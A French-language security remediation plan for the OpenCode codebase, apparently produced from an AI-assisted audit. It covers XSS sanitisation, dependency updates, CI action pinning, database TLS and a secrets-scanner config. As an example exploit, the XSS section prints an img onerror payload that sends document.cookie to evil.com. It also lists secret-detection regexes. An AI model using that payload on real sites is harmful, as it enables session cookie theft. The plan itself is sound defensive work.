# Plan de correction sécurité — OpenCode
**Audit CSO du 2026-05-07** | Rapport : `.gstack/security-reports/2026-05-07-164646.json`

---

## Résumé des findings

| # | Sévérité | Confiance | Finding | Fichier |
|---|----------|-----------|---------|---------|
| 1 | HIGH | 9/10 | XSS : LLM output non-sanitisé sur page de partage publique | `packages/web/src/components/share/content-markdown.tsx:44` |
| 2 | MEDIUM | 9/10 | DOMPurify 3.3.1 vulnérable (7 CVEs mXSS, require >=3.3.2) | `packages/ui/package.json:56` |
| 3 | HIGH | 8/10 | Action CI unpinnée `anomalyco/opencode@latest` + `OPENCODE_API_KEY` exposée | `.github/workflows/opencode.yml:29` |
| 4 | HIGH | 8/10 | Action CI unpinnée `mitchellh/vouch@main` + `issues:write` | `.github/workflows/vouch-manage-by-issue.yml:32` |
| 5 | HIGH | 8/10 | Fastify content-type bypass dans `opencode-gitlab-auth` (CVE GHSA-247c-9743-5963) | `packages/opencode/package.json` |
| 6 | MEDIUM | 8/10 | TLS `rejectUnauthorized: false` sur la DB console (MySQL prod) | `packages/console/core/drizzle.config.ts:17` |
| 7 | LOW | 8/10 | `.gstack/` non gitignored → rapports sécurité exposables | `.gitignore` (**corrigé** lors de l'audit) |

---

## P0 — Immédiat (< 1 jour)

### Fix #1 : Ajouter DOMPurify dans `content-markdown.tsx`

**Problème :** Le composant `ContentMarkdown` du package `web` (page de partage public) rend le texte LLM via `marked` sans sanitisation. `marked` passe le HTML brut tel quel. La page `share.opencode.ai` est publiquement accessible.

**Exploit type :** LLM génère `<img src=x onerror=fetch('https://evil.com/'+document.cookie)>` → session partagée → XSS exécuté chez chaque visiteur.

**Fichier :** `packages/web/src/components/share/content-markdown.tsx`

**Correction :**
```diff
+ import DOMPurify from "dompurify"

  export function ContentMarkdown(props: Props) {
    const [html] = createResource(
      () => strip(props.text),
      async (markdown) => {
-       return markedWithShiki.parse(markdown)
+       const raw = await markedWithShiki.parse(markdown)
+       if (typeof window !== "undefined" && DOMPurify.isSupported) {
+         return DOMPurify.sanitize(raw, {
+           USE_PROFILES: { html: true },
+           SANITIZE_NAMED_PROPS: true,
+           FORBID_TAGS: ["style"],
+           FORBID_CONTENTS: ["style", "script"],
+         })
+       }
+       return raw
      },
    )
```

**Ajouter la dépendance** dans `packages/web/package.json` :
```json
"dompurify": "catalog:"
```
(DOMPurify est déjà dans le workspace catalog via `packages/ui/package.json`)

**Ajouter à `.eslintrc.restrict.cjs`** sous "Vetted call sites" :
```
 *   - packages/web/src/components/share/content-markdown.tsx:XX  // DOMPurify-sanitized marked output
```

**Vérification :** Tester avec un payload `<img src=x onerror=alert(1)>` dans un message LLM, partager la session, vérifier que le payload est neutralisé.

---

### Fix #2 : Mettre à jour DOMPurify vers >=3.3.2

**Problème :** DOMPurify 3.3.1 a 7 CVEs de bypass XSS actives (mXSS via re-contextualisation, prototype pollution, FORBID_TAGS bypass…).

**Commande :**
```bash
cd opencode
bun update dompurify
```
Vérifier que la version dans `bun.lock` monte à >=3.3.2 (dernière stable : 3.3.3 à date d'audit).

**Vérification :** `grep '"dompurify"' bun.lock | head -3` → version >=3.3.2

---

## P1 — Cette semaine (< 5 jours)

### Fix #3 : Pinner les actions CI sur SHA

**Problème :** Deux actions externes utilisent des refs mutables (`@latest`, `@main`) avec accès à des secrets.

#### 3a — `anomalyco/opencode@latest` dans `opencode.yml`

```bash
# Obtenir le SHA courant de l'action
gh api repos/anomalyco/opencode/commits/HEAD --jq '.sha'
```

**Fichier :** `.github/workflows/opencode.yml` ligne 29
```diff
-       uses: anomalyco/opencode/github@latest
+       uses: anomalyco/opencode/github@<SHA-COMPLET-40-CHARS>  # pin 2026-05-07
```

> **Note :** Vérifier que `anomalyco` est bien une org de confiance (fork officiel de `sst`). Si c'est un alias du même projet, envisager de copier l'action dans `.github/actions/opencode/` pour éliminer la dépendance externe.

#### 3b — `mitchellh/vouch@main` dans `vouch-manage-by-issue.yml`

```bash
gh api repos/mitchellh/vouch/commits/HEAD --jq '.sha'
```

**Fichier :** `.github/workflows/vouch-manage-by-issue.yml` ligne 32
```diff
-       uses: mitchellh/vouch/action/manage-by-issue@main
+       uses: mitchellh/vouch/action/manage-by-issue@<SHA-COMPLET-40-CHARS>  # pin 2026-05-07
```

**Vérification :** Ouvrir une issue test pour vérifier que le workflow fonctionne avec la ref pinnée.

---

### Fix #4 : Corriger TLS console DB (`rejectUnauthorized: false`)

**Problème :** La connexion MySQL du service console désactive la validation TLS. MITM possible depuis le même VPC/réseau.

**Fichier :** `packages/console/core/drizzle.config.ts`

**Correction (RDS avec CA bundle) :**
```typescript
import { readFileSync } from "node:fs"

// Utiliser le CA bundle AWS RDS (télécharger depuis https://truststore.pki.rds.amazonaws.com/global/global-bundle.pem)
ssl: {
  ca: readFileSync(process.env.RDS_CA_BUNDLE_PATH ?? "/etc/ssl/certs/aws-rds-ca.pem").toString(),
},
```

Ou, si le serveur MySQL utilise un cert auto-signé géré par SST :
```typescript
ssl: {
  // Utiliser le cert exposé par SST Resource si disponible
  ca: Resource.Database.sslCert,  // adapter selon le binding SST
},
```

**Vérification :** Tester la connexion Drizzle et confirmer que les migrations fonctionnent. Confirmer l'absence de `UNABLE_TO_VERIFY_LEAF_SIGNATURE` dans les logs — si présent, le CA bundle est incorrect.

---

## P2 — Prochaine sprint (< 2 semaines)

### Fix #5 : Mettre à jour `opencode-gitlab-auth` (Fastify CVE)

**Problème :** `opencode-gitlab-auth@2.0.1` dépend de Fastify >=5.3.2 <=5.8.4, vulnérable au bypass de validation body via Content-Type header avec espace (GHSA-247c-9743-5963).

**Vérification préalable :**
```bash
# Vérifier la version Fastify dans le plugin
cat node_modules/opencode-gitlab-auth/package.json | grep fastify
# Vérifier si le callback OAuth est exposé sur le réseau ou localhost-only
grep -r "listen\|port" node_modules/opencode-gitlab-auth/dist/ 2>/dev/null | head -10
```

**Action :**
1. Contacter les mainteneurs ou ouvrir une issue sur le repo `opencode-gitlab-auth` pour demander la mise à jour Fastify >5.8.4.
2. En attendant, vérifier que le callback OAuth est uniquement accessible en localhost (non exposé réseau).
3. Quand une version corrigée est publiée : `bun update opencode-gitlab-auth`

---

## P3 — Amélioration continue

### Add #1 : Créer `.gitleaks.toml` pour protéger le repo

Aucun scanner de secrets n'est configuré. Créer `.gitleaks.toml` à la racine :

```toml
title = "OpenCode Secret Scanner"

[extend]
useDefault = true

[[rules]]
description = "OpenCode API Key"
id = "opencode-api-key"
regex = '''OPENCODE_API_KEY\s*=\s*['""]?[A-Za-z0-9_-]{20,}['""]?'''
tags = ["key", "opencode"]

[[rules]]
description = "Anthropic API Key"  
id = "anthropic-api-key"
regex = '''sk-ant-[A-Za-z0-9_-]{20,}'''
tags = ["key", "anthropic"]

[allowlist]
paths = [
  "packages/opencode/src/security/scanner.ts",
  "packages/opencode/test/security/",
  ".gstack/",
]
```

Ajouter dans le CI (`.github/workflows/`) :
```yaml
- name: Scan secrets
  uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

### Add #2 : Ajouter `sst/opencode@latest` dans la liste des actions à pinner

**Fichier :** `.github/workflows/docs-update.yml` ligne 46
```diff
-       uses: sst/opencode/github@latest
+       uses: sst/opencode/github@<SHA>  # pin
```

### Add #3 : ESLint CI enforcement pour innerHTML

Le fichier `.eslintrc.restrict.cjs` existe mais ESLint n'est pas exécuté en CI (commentaire dans le fichier : *"The monorepo does not currently run ESLint in CI"*).

Ajouter un step CI minimal pour `innerHTML` audit :
```yaml
- name: Lint innerHTML usage
  run: bunx eslint --rulesdir . --rule-file .eslintrc.restrict.cjs packages/web/src packages/app/src
```

---

## Checklist de vérification post-correction

```
[ ] P0-F1 : Test XSS payload sur share page → neutralisé
[ ] P0-F1 : Entrée ajoutée dans .eslintrc.restrict.cjs
[ ] P0-F2 : bun.lock contient dompurify@>=3.3.2
[ ] P1-F3a : opencode.yml utilise un SHA, workflow /oc fonctionnel
[ ] P1-F3b : vouch-manage-by-issue.yml utilise un SHA, vouch fonctionnel
[ ] P1-F4 : drizzle migrate sans erreur TLS, rejectUnauthorized absent
[ ] P2-F5 : opencode-gitlab-auth mise à jour, OAuth GitLab testé
[ ] P3-A1 : .gitleaks.toml créé, scan passant en CI
[ ] P3-A2 : sst/opencode@latest pinné
[ ] P3-A3 : ESLint innerHTML enforcement en CI
```

---

## Contexte de l'audit

- **Date :** 2026-05-07
- **Périmètre :** Full scan (phases 0-14), mode daily (gate 8/10)
- **Rapport JSON :** `.gstack/security-reports/2026-05-07-164646.json`
- **Outils :** /cso gstack v1, scan statique + vérification code manuelle
- **Non audité :** infrastructure SST/AWS (pas d'accès), pentest dynamique (pas d'env dédié)
- **Rappel :** Ce rapport est un premier filtre IA — engagement d'un cabinet de pentest recommandé pour la production (share.opencode.ai, console.opencode.ai)
